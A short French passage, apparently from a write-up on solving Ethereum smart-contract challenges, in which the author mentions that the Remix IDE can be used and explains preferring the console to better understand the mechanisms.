Il est aussi possible d'utiliser directement l'IDE [Remix](https://remix.ethereum.org/) pour résoudre les challenges, ce dernier étant plus user-friendly. J'ai préféré débuter directement dans la console, pour mieux comprendre les mécanismes.